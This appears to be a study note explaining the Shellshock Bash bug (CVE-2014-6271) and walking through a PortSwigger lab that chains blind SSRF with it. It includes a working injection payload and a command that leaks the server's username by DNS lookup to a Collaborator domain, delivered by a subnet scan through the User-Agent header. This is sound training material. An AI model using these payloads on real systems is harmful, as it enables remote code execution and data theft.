# Shellshock Vulnerability (CVE-2014-6271) & SSRF Chaining

## 1. What is Shellshock?

**Shellshock** is a critical vulnerability discovered in 2014 affecting **Bash** (Bourne Again SHell), the default command-line interpreter for most Linux/Unix systems.

* **The Core Issue:** It allows an attacker to inject arbitrary commands via **Environment Variables**.
* **The Impact:** Remote Code Execution (RCE). An attacker can fully compromise the server.

### The Mechanism: Functions in Bash
To understand the bug, we must understand how Bash handles functions. Bash allows you to define a function and export it to an environment variable so that child processes can use it.

**Normal Function Definition:**
```bash
print_hello() {
    echo "Hello";
}
```

**How Bash stores it in an Environment Variable:** When Bash exports a function, it converts it into a variable that looks like this:
```
VAR='() { echo "Hello"; }'
```
The sequence `() {` is the "signature" that tells Bash: _"This variable contains a function definition, not just a plain string."_

## 2. Deconstructing the "Magic String"

The exploit relies on a specific sequence of symbols. Let's break down the payload character by character to understand the logic.

**The Payload:**
```
() { :;}; echo "HACKED"
```

| Symbol    | Meaning              | Context                                                                                                                                                                               |
| --------- | -------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `()`      | **Function Marker**  | This tells Bash: "I am not a string; I am a function definition." This triggers the parsing mode.                                                                                     |
| {         | **Start Body**       | Marks the beginning of the function's actual code block.                                                                                                                              |
| `:;`      | **The Null Command** | `:` is a command that means "Do nothing" (returns true).<br>`;` is the separator.<br>**Why?** The attacker wants the shortest, valid, empty function body possible to pass the check. |
| }         | **End Body**         | Marks the end of the function definition.                                                                                                                                             |
| `;`       | **Separator**        | Tells Bash: "The function definition is completely finished. Get ready for the next command."                                                                                         |
| `echo...` | **The Injection**    | **This is the flaw.** This command comes _after_ the function closes, but Bash executes it anyway.                                                                                    |
## 3. The Logic Flaw (Why it works)

The vulnerability lies in the **Bash Parser** logic (specifically in `variables.c`).

1. **Normal Behavior:** When Bash starts up, it reads environment variables. If it sees a variable starting with `() {`, it parses the function logic, stores it in memory, and **stops** parsing when it hits the closing brace `}`.
    
2. **The Flaw:** In vulnerable versions, the parser **did not stop** at the closing brace `}`. Instead, it continued to execute any strings/commands attached to the end of the definition.
    

**The Execution Flow:**

1. Bash reads `() { :;};`. It thinks: _"Okay, this is an empty function. I'll import it."_
    
2. It sees the semicolon `;`. It thinks: _"Function definition done."_
    
3. It immediately sees `echo "HACKED"`. Instead of ignoring it or throwing an error, it **executes it immediately** with the privileges of the user running Bash.

## 4. Connection to SSRF (The Attack Vector)

How do we get this malicious variable into a remote server? We use **HTTP Headers** and **CGI**.

### The CGI Translation

Old web servers (like Apache with `mod_cgi`) map HTTP Request Headers into Environment Variables so scripts can use them.

- **Request Header:** `User-Agent: Mozilla/5.0`
    
- **Server Variable:** `HTTP_USER_AGENT="Mozilla/5.0"`
    

### The Chain: SSRF + Shellshock

In complex scenarios (like the PortSwigger Lab), the architecture often looks like this:

1. **Attacker** sends a request to a **Public Web Server**.
    
2. **Public Server** is vulnerable to **SSRF** (Server-Side Request Forgery). It can be tricked into talking to internal servers.
    
3. **Internal Server** is hidden from the internet but is running a vulnerable version of Bash/CGI.
    

**The Strategy:** We use the Public Server's SSRF vulnerability as a "Tunnel" or "Proxy" to smuggle the Shellshock payload into the Internal Server via the `User-Agent` header.

## 5. Lab Walkthrough: Blind SSRF & Shellshock

**Lab:** PortSwigger - Blind SSRF with Shellshock exploitation. **Goal:** Exfiltrate the OS username of the internal server.

### Step 1: Detect SSRF

1. Analyze the request in **Burp Suite**.
    
2. Identify that the `Referer` header (or a specific parameter) is being used to fetch resources.
    
3. This is your entry point to reach the internal network (e.g., `192.168.0.x`).

![[Pasted image 20251119025234.png]]

### Step 2: Craft the Payload

Since it is **Blind SSRF**, we won't see the output of the command in the HTTP response. We need **Out-of-Band (OOB)** interaction. We will force the server to perform a DNS lookup to a domain we control (Burp Collaborator).

**The Code:**
```
() { :;}; /usr/bin/nslookup $(whoami).4afwzbqp41aykrlx344w7m7ytpzgnabz.oastify.com
```
### Step 3: Execute (Burp Intruder)

We don't know the exact IP of the internal server, so we must scan the subnet.

1. Send the valid request to **Burp Intruder**.
    
2. **Injection Point 1 (The Carrier):** Set the `User-Agent` header to the Shellshock Payload defined above.
    
3. **Injection Point 2 (The Target):** In the `Referer` URL (the SSRF point), change the IP to `192.168.0.ยง1ยง`.
    
4. **Payload Type:** Numbers (1 to 255).
    
5. Launch Attack.

![[Pasted image 20251119025338.png]]

### Step 4: Analyze Results
- Go to the **Burp Collaborator** tab.
    
- Click **Poll now**.
    
- Look for a DNS interaction.

![[Pasted image 20251119025436.png]]